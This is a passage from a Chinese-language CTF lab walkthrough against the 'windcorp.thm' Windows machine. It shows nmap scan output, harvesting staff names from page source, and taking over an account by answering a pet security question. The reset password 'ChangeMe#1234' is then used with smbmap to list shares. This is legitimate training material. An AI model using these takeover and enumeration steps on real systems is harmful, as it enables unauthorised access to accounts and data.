class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   SqueezeCenter_CLI: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 No URI</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 49</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   WMSRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Illegal character CNTL=0x1</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 69</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;</span></span><br><span class="line"><span class="string">9091/tcp  open  ssl/xmltec-xmlmail?</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 69</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     Date: Fri, 08 Jul 2022 06:28:30 GMT</span></span><br><span class="line"><span class="string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|     Accept-Ranges: bytes</span></span><br><span class="line"><span class="string">|     Content-Length: 115</span></span><br><span class="line"><span class="string">|     &lt;html&gt;</span></span><br><span class="line"><span class="string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span></span><br><span class="line"><span class="string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span></span><br><span class="line"><span class="string">|     &lt;/head&gt;</span></span><br><span class="line"><span class="string">|     &lt;body&gt;</span></span><br><span class="line"><span class="string">|     &lt;/body&gt;</span></span><br><span class="line"><span class="string">|     &lt;/html&gt;</span></span><br><span class="line"><span class="string">|   HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200 OK</span></span><br><span class="line"><span class="string">|     Date: Fri, 08 Jul 2022 06:28:32 GMT</span></span><br><span class="line"><span class="string">|     Allow: GET,HEAD,POST,OPTIONS</span></span><br><span class="line"><span class="string">|   Help: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 No URI</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 49</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   RPCCheck: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Illegal character OTEXT=0x80</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 71</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   RTSPRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Unknown Version</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 58</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span></span><br><span class="line"><span class="string">|   SSLSessionReq: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Illegal character CNTL=0x16</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">|     Content-Length: 70</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span></span><br><span class="line"><span class="string">| Not valid before: 2020-05-01T08:39:00</span></span><br><span class="line"><span class="string">|_Not valid after:  2025-04-30T08:39:00</span></span><br><span class="line"><span class="string">9389/tcp  open  mc-nmf              .NET Message Framing</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc               Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">49675/tcp open  msrpc               Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49676/tcp open  msrpc               Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49695/tcp open  msrpc               Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49922/tcp open  msrpc               Microsoft Windows RPC</span></span><br><span class="line"><span class="string">4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://google.com/cgi-bin/submit.cgi?new-service :</span></span><br><span class="line"><span class="string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span></span><br><span class="line"><span class="string">SF-Port5262-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span></span><br><span class="line"><span class="string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span></span><br><span class="line"><span class="string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span></span><br><span class="line"><span class="string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span></span><br><span class="line"><span class="string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span></span><br><span class="line"><span class="string">SF-Port5275-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span></span><br><span class="line"><span class="string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span></span><br><span class="line"><span class="string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span></span><br><span class="line"><span class="string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span></span><br><span class="line"><span class="string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span></span><br><span class="line"><span class="string">SF-Port9090-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE77%P=x86_64-unknown-linux-g</span></span><br><span class="line"><span class="string">SF:nu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20J</span></span><br><span class="line"><span class="string">SF:ul\x202022\x2006:28:07\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2</span></span><br><span class="line"><span class="string">SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges</span></span><br><span class="line"><span class="string">SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/titl</span></span><br><span class="line"><span class="string">SF:e&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp\&quot;&gt;\n&lt;</span></span><br><span class="line"><span class="string">SF:/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(JavaRMI,C3,&quot;HTTP/1\.1\x20400\x</span></span><br><span class="line"><span class="string">SF:20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charse</span></span><br><span class="line"><span class="string">SF:t=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h</span></span><br><span class="line"><span class="string">SF:1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNT</span></span><br><span class="line"><span class="string">SF:L=0x0&lt;/pre&gt;&quot;)%r(WMSRequest,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character</span></span><br><span class="line"><span class="string">SF:\x20CNTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten</span></span><br><span class="line"><span class="string">SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x2040</span></span><br><span class="line"><span class="string">SF:0&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x1&lt;/pre&gt;&quot;)%r(ibm-db</span></span><br><span class="line"><span class="string">SF:2-das,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nConte</span></span><br><span class="line"><span class="string">SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCo</span></span><br><span class="line"><span class="string">SF:nnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x2</span></span><br><span class="line"><span class="string">SF:0Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(SqueezeCenter_CLI,9B,&quot;HTTP/</span></span><br><span class="line"><span class="string">SF:1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859</span></span><br><span class="line"><span class="string">SF:-1\r\nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20M</span></span><br><span class="line"><span class="string">SF:essage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/pre&gt;&quot;)%r(informix,C3,&quot;HTTP</span></span><br><span class="line"><span class="string">SF:/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20te</span></span><br><span class="line"><span class="string">SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20c</span></span><br><span class="line"><span class="string">SF:lose\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20ch</span></span><br><span class="line"><span class="string">SF:aracter\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(drda,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20c</span></span><br><span class="line"><span class="string">SF:haracter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r</span></span><br><span class="line"><span class="string">SF:\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Messa</span></span><br><span class="line"><span class="string">SF:ge\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%</span></span><br><span class="line"><span class="string">SF:r(HTTPOptions,56,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\</span></span><br><span class="line"><span class="string">SF:x202022\x2006:28:16\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;);</span></span><br><span class="line"><span class="string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span></span><br><span class="line"><span class="string">SF-Port9091-TCP:V=7.92SVN%T=SSL%I=7%D=7/8%Time=62C7CE8F%P=x86_64-unknown-l</span></span><br><span class="line"><span class="string">SF:inux-gnu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x200</span></span><br><span class="line"><span class="string">SF:8\x20Jul\x202022\x2006:28:30\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20</span></span><br><span class="line"><span class="string">SF:Jan\x202020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-</span></span><br><span class="line"><span class="string">SF:Ranges:\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;</span></span><br><span class="line"><span class="string">SF:&lt;/title&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp</span></span><br><span class="line"><span class="string">SF:\&quot;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(HTTPOptions,56,&quot;HTTP/1\.</span></span><br><span class="line"><span class="string">SF:1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2006:28:32\x20GMT</span></span><br><span class="line"><span class="string">SF:\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;)%r(RTSPRequest,AD,&quot;HTTP/1\</span></span><br><span class="line"><span class="string">SF:.1\x20400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=i</span></span><br><span class="line"><span class="string">SF:so-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;B</span></span><br><span class="line"><span class="string">SF:ad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;&quot;)%r(R</span></span><br><span class="line"><span class="string">SF:PCCheck,C7,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nC</span></span><br><span class="line"><span class="string">SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r</span></span><br><span class="line"><span class="string">SF:\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason</span></span><br><span class="line"><span class="string">SF::\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;&quot;)%r(DNSVersionBindReqTCP,</span></span><br><span class="line"><span class="string">SF:C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ</span></span><br><span class="line"><span class="string">SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti</span></span><br><span class="line"><span class="string">SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illeg</span></span><br><span class="line"><span class="string">SF:al\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(DNSStatusRequestTCP,C3,&quot;HTTP/1\.1</span></span><br><span class="line"><span class="string">SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht</span></span><br><span class="line"><span class="string">SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\</span></span><br><span class="line"><span class="string">SF:r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20charact</span></span><br><span class="line"><span class="string">SF:er\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(Help,9B,&quot;HTTP/1\.1\x20400\x20No\x20URI\r\nCont</span></span><br><span class="line"><span class="string">SF:ent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nC</span></span><br><span class="line"><span class="string">SF:onnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x</span></span><br><span class="line"><span class="string">SF:20No\x20URI&lt;/pre&gt;&quot;)%r(SSLSessionReq,C5,&quot;HTTP/1\.1\x20400\x20Illegal\x20</span></span><br><span class="line"><span class="string">SF:character\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1</span></span><br><span class="line"><span class="string">SF:\r\nContent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Mes</span></span><br><span class="line"><span class="string">SF:sage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;</span></span><br><span class="line"><span class="string">SF:&quot;);</span></span><br><span class="line"><span class="string">Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2022-07-08T06:29:07</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   311: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Fri Jul  8 14:30:06 2022 -- 1 IP address (1 host up) scanned in 657.96 seconds</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708143519611.png" srcset="/img/loading.gif" lazyload alt="image-20220708143519611"  />
+
+<p>Windows server. IIS.右键查看源代码会发现以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicfish718@fire.windcorp.thm&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:organicfish718@fire.windcorp.thm&quot;</span>&gt;</span>Antonietta Vidal<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span>Britney Palmer<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span>Brittany Cruz<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=angrybird253@fire.windcorp.thm&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:angrybird253@fire.windcorp.thm&quot;</span>&gt;</span>Carla Meyer<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=buse@fire.windcorp.thm&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:buse@fire.windcorp.thm&quot;</span>&gt;</span>Buse Candan<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span> Edeltraut Daub<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edward@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:Edward@fire.windcorp.thm&quot;</span>&gt;</span> Edward Lewis<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Emile@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:Emile@fire.windcorp.thm&quot;</span>&gt;</span> Emile Lavoie<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span> Emile Henry<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span> Emily Anderson<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=sadswan869@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Hemmo Boschma<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=goldencat416@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Isabella Hughes<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span> Isra Saur<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span> Jackson Vasquez<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;xmpp:orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span> Jaqueline Dittmer<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看起来目标URL地址就是windcorp.thm。</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708144408730.png" srcset="/img/loading.gif" lazyload alt="image-20220708144408730"></p>
+<p>三个用户名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Emily Jensen</span><br><span class="line">Lily Levesque</span><br><span class="line">Kirk Uglas</span><br></pre></td></tr></table></figure>
+
+<p>或许目标内部员工有把对应图像文件名当成用户名的习惯，所以其图像名称获取能为真正用户名猜想做一些参考。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://windcorp.thm/img/Emilieje.jpg</span><br><span class="line">http://windcorp.thm/img/lilyleAndSparky.jpg</span><br><span class="line">http://windcorp.thm/img/kirkug.jpg</span><br></pre></td></tr></table></figure>
+
+<p>Lily Levesque的文件中有一个And链接了另一个名称Sparky。谁是Sparky，抱的这只宠物狗？</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708150128234.png" srcset="/img/loading.gif" lazyload alt="image-20220708150128234"></p>
+<p>在右上角重置密码中，能看到其中一个问题是最喜欢的宠物，输入后会重置密码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ChangeMe#1234</span><br></pre></td></tr></table></figure>
+
+<p>并提醒记得登录后修改。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> TIP=10.10.121.103</span><br><span class="line">$ smbmap -H <span class="variable">$TIP</span> -u lilyle -p ChangeMe<span class="comment">#1234</span></span><br><span class="line">[+] IP: 10.10.121.103:445	Name: windcorp.thm                                      </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share </span><br><span class="line">	Shared                                            	READ ONLY	</span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share </span><br><span class="line">	Users                                             	READ ONLY	</span><br></pre></td></tr></table></figure>
+
+<p>Users中会有很多用户名，可以被用来制作用户名字典。</p>
